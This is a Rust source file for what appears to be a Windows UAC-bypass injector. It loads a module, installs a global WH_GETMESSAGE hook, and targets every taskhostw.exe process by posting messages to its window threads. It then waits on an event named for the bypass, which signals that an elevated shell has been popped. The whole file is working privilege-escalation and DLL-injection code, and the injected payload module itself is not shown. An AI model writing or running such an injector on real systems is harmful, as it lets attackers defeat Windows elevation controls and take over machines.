mod enum_process;
mod enum_thread;
mod loader;

use std::{ffi::CStr, time::Duration};

use windows::{
    Win32::{
        Foundation::{HWND, LPARAM, WAIT_TIMEOUT, WPARAM},
        System::Threading::{CreateEventA, WaitForSingleObject},
        UI::WindowsAndMessaging::{
            EnumThreadWindows, GetWindowThreadProcessId, PostThreadMessageA, SetWindowsHookExA,
            UnhookWindowsHookEx, WH_GETMESSAGE,
        },
    },
    core::{BOOL, s},
};

use crate::{enum_process::EnumProcess, enum_thread::EnumThreads};

fn main() {
    let mut args = std::env::args().skip(1);

    let module_path = args.next().unwrap();

    // Load module to inject
    let module = match loader::load_module(&module_path) {
        Ok(module) => module,
        Err(why) => {
            eprintln!("Failed to load module: {why}");
            return;
        }
    };

    // Create event to get notified whenever a shell is popped
    let event = match unsafe { CreateEventA(None, true, false, s!("uac-bypass-uiaccess-evt")) } {
        Ok(event) => event,
        Err(why) => {
            eprintln!("Failed to create event: {why}");
            return;
        }
    };

    // Create a global hook
    let hook = match unsafe {
        SetWindowsHookExA(
            WH_GETMESSAGE,
            std::mem::transmute(module.get_proc_address()),
            Some(module.get_module_handle()),
            0,
        )
    } {
        Ok(hook) => hook,
        Err(why) => {
            eprintln!("Failed to set hook: {why}");
            return;
        }
    };

    // Notify all taskhostw window threads
    let Ok(proc_enum) = EnumProcess::new() else {
        eprintln!("Failed to create process enumerator");
        return;
    };

    let Ok(thread_enum) = EnumThreads::new(0) else {
        eprintln!("Failed to create thread enumerator");
        return;
    };

    let process_ids = proc_enum
        .filter_map(|proc| {
            let proc_name = unsafe { CStr::from_ptr(proc.szExeFile.as_ptr()) };

            // Elevation checks are performed by the payload, so we just target all taskhostw processes here
            proc_name
                .to_string_lossy()
                .eq_ignore_ascii_case("taskhostw.exe")
                .then_some(proc.th32ProcessID)
        })
        .collect::<Vec<u32>>();

    for thread in thread_enum.filter(|thread| process_ids.contains(&thread.th32OwnerProcessID)) {
        alert_thread(thread.th32ThreadID);
    }

    // Wait for injection completion
    let result = unsafe { WaitForSingleObject(event, 10000) };
    if result == WAIT_TIMEOUT {
        eprintln!("Injection timed out");
    }

    unsafe {
        _ = UnhookWindowsHookEx(hook);
    }
}

/// This export is used by the loaded module to differentiate between the injector and the target
#[unsafe(no_mangle)]
pub extern "system" fn is_injector() -> isize {
    1
}

/// Send an empty message to all windows on the specified thread ID
fn alert_thread(thread_id: u32) {
    unsafe extern "system" fn alert_thread_proc(hwnd: HWND, _lparam: LPARAM) -> BOOL {
        let thread_id = unsafe { GetWindowThreadProcessId(hwnd, None) };
        if thread_id == 0 {
            return true.into();
        }

        let mut tries = 10;
        let mut success = false;

        loop {
            std::thread::sleep(Duration::from_millis(100));

            let post_success = unsafe {
                PostThreadMessageA(thread_id, 0x511, WPARAM::default(), LPARAM::default()).is_ok()
            };

            success = success || post_success;
            tries -= 1;

            if tries == 0 || success {
                break;
            }
        }

        false.into()
    }

    unsafe { _ = EnumThreadWindows(thread_id, Some(alert_thread_proc), LPARAM::default()) };
}
